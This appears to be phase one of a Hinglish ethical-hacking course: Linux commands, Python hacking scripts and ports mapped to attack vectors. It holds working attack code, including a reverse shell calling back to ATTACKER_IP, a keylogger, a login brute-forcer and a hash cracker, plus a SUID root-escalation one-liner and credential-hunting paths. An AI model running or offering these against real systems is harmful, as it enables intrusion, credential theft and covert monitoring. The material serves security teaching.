# 🏗️ Phase 1 — Foundation: Linux, Python & Networking

> Bina foundation ke building khadi nahi hoti. Yeh phase skip mat kar — yeh sab ka base hai.

---

## 🐧 Part A: Linux Mastery

### Terminal = Your Weapon

```bash
# ═══════════════════════════════════════════════
# FILE SYSTEM — Samajh le poora structure
# ═══════════════════════════════════════════════

/etc/passwd       # All user accounts — first place to check
/etc/shadow       # Password hashes (root only) — gold mine!
/etc/hosts        # Local DNS entries — useful for MITM
/etc/crontab      # Scheduled tasks — priv esc vector!
/var/log/          # System logs — forensics goldmine
/tmp/              # World-writable — drop payloads here
/dev/null          # Black hole — redirect errors here
/proc/             # Running process info — memory forensics
~/.ssh/            # SSH keys — lateral movement
~/.bash_history    # Command history — credential hunting

# ═══════════════════════════════════════════════
# ESSENTIAL COMMANDS — Yeh ratta maar le
# ═══════════════════════════════════════════════

# Navigation
pwd && ls -laR && cd /etc && tree -L 2

# File operations
cat /etc/passwd | grep -v "nologin" | cut -d: -f1     # Active users
find / -perm -4000 -type f 2>/dev/null                  # SUID binaries (priv esc!)
find / -name "*.conf" -readable 2>/dev/null             # Readable configs
find / -writable -type f 2>/dev/null                    # Writable files
locate password | head -20                              # Quick file search

# Process & Network
ps auxww | grep -v grep                                 # All processes
ss -tulnp                                               # Open ports
netstat -antp                                           # Network connections
lsof -i :80                                             # What's using port 80

# Text wizardry
awk -F: '$3 == 0 {print $1}' /etc/passwd               # Find UID 0 (root-level)
sed -n '5,10p' file.txt                                 # Print lines 5-10
sort file.txt | uniq -c | sort -rn                      # Count & sort occurrences
strings binary_file | grep -i "pass"                    # Extract strings from binary

# Compression & Transfer
tar czf archive.tar.gz /path/ && base64 archive.tar.gz  # Compress + encode
python3 -m http.server 8080                             # Instant web server
scp file user@target:/tmp/                              # Secure copy
```

### File Permissions Deep Dive

```bash
# Permission format: drwxrwxrwx
#                    │ │   │   └── Others
#                    │ │   └────── Group  
#                    │ └────────── Owner
#                    └──────────── Type (d=dir, -=file, l=link)

# SPECIAL PERMISSIONS — Yeh hacking ke liye CRITICAL hai!
# ────────────────────────────────────────────────────────

# SUID (Set User ID) — File runs as OWNER (usually root!)
chmod u+s /usr/bin/program      # Set SUID
find / -perm -4000 2>/dev/null  # Find all SUID files

# Why SUID matters for hackers:
# If /usr/bin/python3 has SUID set and owned by root:
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# BOOM — you're root!

# Check GTFOBins for EVERY SUID binary you find:
# https://gtfobins.github.io/

# SGID (Set Group ID) — File runs as GROUP
chmod g+s /path/
find / -perm -2000 2>/dev/null

# Sticky Bit — Only owner can delete (like /tmp)
chmod +t /directory/
```

### 🎥 WATCH THESE VIDEOS FIRST
```
1. "Linux for Hackers" — NetworkChuck (Full Course)
   https://www.youtube.com/watch?v=VbEx7B_PTOE

2. "Linux Essentials for Ethical Hacking" — HackerSploit
   https://www.youtube.com/playlist?list=PLBf0hzazHTGOEuhPQSnq-Ej8jRyXxfYvl

3. "Kali Linux Full Course" — freeCodeCamp (4 hours)
   https://www.youtube.com/watch?v=lZAoFs75_cs
```

---

## 🐍 Part B: Python for Hacking

> Python is the HACKER'S language. AI tools bhi Python mein likhe jaate hain.
> Tujhe full Python nahi seekhna — sirf woh jo hacking mein kaam aaye.

### Install & Setup
```bash
# Python 3 already in Kali
python3 --version
pip3 install requests beautifulsoup4 scapy paramiko pwntools
```

### Essential Python for Hackers

```python
#!/usr/bin/env python3
"""
Python Hacking Essentials — Practice these scripts in Kali
"""

# ═══════════════════════════════════════════════
# 1. PORT SCANNER (Fast, Multi-threaded)
# ═══════════════════════════════════════════════
import socket
import threading
from queue import Queue

target = "192.168.1.1"
queue = Queue()
open_ports = []

def scan_port(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
            print(f"[+] Port {port} is OPEN")
        sock.close()
    except:
        pass

def worker():
    while not queue.empty():
        port = queue.get()
        scan_port(port)
        queue.task_done()

# Scan top 1000 ports with 100 threads
for port in range(1, 1001):
    queue.put(port)

for _ in range(100):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()

queue.join()
print(f"\n[*] Open ports: {sorted(open_ports)}")


# ═══════════════════════════════════════════════
# 2. WEB SCRAPER / RECON
# ═══════════════════════════════════════════════
import requests
from bs4 import BeautifulSoup

def recon_website(url):
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        print(f"[*] Title: {soup.title.string if soup.title else 'N/A'}")
        print(f"[*] Status: {r.status_code}")
        print(f"[*] Server: {r.headers.get('Server', 'N/A')}")
        print(f"[*] Tech: {r.headers.get('X-Powered-By', 'N/A')}")
        
        # Extract all links
        links = [a.get('href') for a in soup.find_all('a', href=True)]
        print(f"[*] Found {len(links)} links")
        
        # Extract forms (login pages, input fields)
        forms = soup.find_all('form')
        print(f"[*] Found {len(forms)} forms")
        for form in forms:
            print(f"    Action: {form.get('action')}")
            print(f"    Method: {form.get('method', 'GET')}")
            inputs = form.find_all('input')
            for inp in inputs:
                print(f"    Input: {inp.get('name')} ({inp.get('type')})")
    except Exception as e:
        print(f"[-] Error: {e}")

# recon_website("http://target.com")


# ═══════════════════════════════════════════════
# 3. BRUTE FORCE LOGIN
# ═══════════════════════════════════════════════
def brute_force_login(url, username, wordlist_path):
    with open(wordlist_path, 'r', errors='ignore') as f:
        for password in f:
            password = password.strip()
            data = {"username": username, "password": password}
            r = requests.post(url, data=data)
            
            if "Invalid" not in r.text and "failed" not in r.text.lower():
                print(f"[+] FOUND! {username}:{password}")
                return password
            else:
                print(f"[-] Trying: {password}")
    print("[-] Password not found in wordlist")
    return None


# ═══════════════════════════════════════════════
# 4. ARP SCANNER (Find devices on network)
# ═══════════════════════════════════════════════
from scapy.all import ARP, Ether, srp

def scan_network(ip_range):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    
    print(f"\n{'IP':<20}{'MAC Address':<20}")
    print("-" * 40)
    for d in devices:
        print(f"{d['ip']:<20}{d['mac']:<20}")
    return devices

# scan_network("192.168.1.0/24")


# ═══════════════════════════════════════════════
# 5. REVERSE SHELL (For authorized testing)
# ═══════════════════════════════════════════════
import subprocess
import os

def reverse_shell(attacker_ip, attacker_port):
    """Connect back to attacker's listener"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, int(attacker_port)))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])

# Catch with: nc -lvnp 4444
# reverse_shell("ATTACKER_IP", 4444)


# ═══════════════════════════════════════════════
# 6. KEYLOGGER (Educational — Lab Only!)
# ═══════════════════════════════════════════════
# pip3 install pynput
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    logging.info(str(key))

# with Listener(on_press=on_press) as listener:
#     listener.join()


# ═══════════════════════════════════════════════
# 7. HASH CRACKER
# ═══════════════════════════════════════════════
import hashlib

def crack_hash(target_hash, wordlist, hash_type="md5"):
    hash_funcs = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256
    }
    func = hash_funcs.get(hash_type)
    
    with open(wordlist, 'r', errors='ignore') as f:
        for word in f:
            word = word.strip()
            if func(word.encode()).hexdigest() == target_hash:
                print(f"[+] Cracked! {target_hash} = {word}")
                return word
    print("[-] Not found")
    return None
```

### 🎥 Python Hacking Videos
```
1. "Python for Ethical Hacking" — TCM Security (FREE, 14 hours)
   https://www.youtube.com/watch?v=xNrLfl7cDHo

2. "Learn Python & Ethical Hacking From Scratch" — Zaid Sabih
   https://www.youtube.com/watch?v=DqgGFDVOgWU

3. "Python for Hackers" — David Bombal
   https://www.youtube.com/watch?v=UBfMfMIvXSc
```

---

## 🌐 Part C: Networking Deep Dive

### TCP/IP — Hacker's Perspective

```
┌──────────────────────────────────────────────────────────────┐
│ LAYER          │ WHAT HACKERS DO HERE                         │
├──────────────────────────────────────────────────────────────┤
│ Application    │ SQLi, XSS, API attacks, malware C2          │
│ Transport      │ Port scanning, SYN flood, session hijacking │
│ Network        │ IP spoofing, ICMP tunneling, routing attacks│
│ Data Link      │ ARP spoofing, MAC flooding, VLAN hopping    │
│ Physical       │ USB attacks, cable tapping, rogue APs       │
└──────────────────────────────────────────────────────────────┘
```

### Ports — Yaad Kar (Attack Vectors Ke Saath)

```
PORT    SERVICE       ATTACK VECTOR
────────────────────────────────────────────────────
21      FTP          Anonymous login, brute force, bounce attack
22      SSH          Brute force, key theft, tunneling
23      Telnet       Sniff credentials (plaintext!)
25      SMTP         Email spoofing, relay attacks
53      DNS          Zone transfer, DNS poisoning, tunneling
80      HTTP         SQLi, XSS, directory traversal, LFI/RFI
110     POP3         Credential sniffing (plaintext)
111     RPCBind      NFS exploitation
135     MSRPC        Windows exploitation
139/445 SMB          EternalBlue, relay attacks, share enum
443     HTTPS        SSL stripping, cert attacks
1433    MSSQL        xp_cmdshell, SQLi
1521    Oracle       TNS poisoning
3306    MySQL        UDF exploitation, brute force
3389    RDP          BlueKeep, brute force, MITM
5432    PostgreSQL   Command execution
5900    VNC          Auth bypass, brute force
6379    Redis        Unauthenticated access → RCE
8080    HTTP Alt     Proxy misconfig, default creds
8443    HTTPS Alt    Same as 443
27017   MongoDB      Unauthenticated access (no auth default!)
```

### Networking Practice with AI
```bash
# Use AI to explain packet captures!
# Step 1: Capture packets
sudo tcpdump -i eth0 -w capture.pcap -c 100

# Step 2: Analyze with tshark
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn

# Step 3: Open in Wireshark (GUI)
wireshark capture.pcap

# Step 4: Ask AI to explain! Copy interesting packets and paste to ChatGPT:
# "Explain this network packet capture and identify any suspicious activity"
```

### 🎥 Networking Videos
```
1. "Networking Fundamentals" — NetworkChuck (Practical)
   https://www.youtube.com/playlist?list=PLIhvC56v63IJVXv0GJcl9vO5Z6znCVb1P

2. "Computer Networking Full Course" — freeCodeCamp (9 hours)
   https://www.youtube.com/watch?v=qiQR5rTSshw

3. "Wireshark Tutorial" — David Bombal
   https://www.youtube.com/watch?v=lb1Dw0elw0Q
```

---

## ✅ Phase 1 Completion Checklist

```
LINUX
[ ] Can navigate file system blindfolded
[ ] Can find SUID binaries and understand why they matter
[ ] Can manage users, permissions, processes
[ ] Can write bash scripts for automation
[ ] Comfortable with text processing (grep, awk, sed, cut)

PYTHON
[ ] Can write port scanner, web scraper
[ ] Can make HTTP requests (GET/POST)
[ ] Can parse HTML with BeautifulSoup
[ ] Can use Scapy for network packets
[ ] Understand sockets and networking in code

NETWORKING
[ ] Know OSI/TCP-IP model from hacker's perspective
[ ] Memorized top 25 ports and their attack vectors
[ ] Can use Wireshark to analyze traffic
[ ] Understand TCP handshake, DNS, ARP
[ ] Can explain how MITM works conceptually
```

---

> **Phase 1 done? → [Phase 2 — AI-Powered Reconnaissance](./Phase2_AI_Recon.md)** 🔍
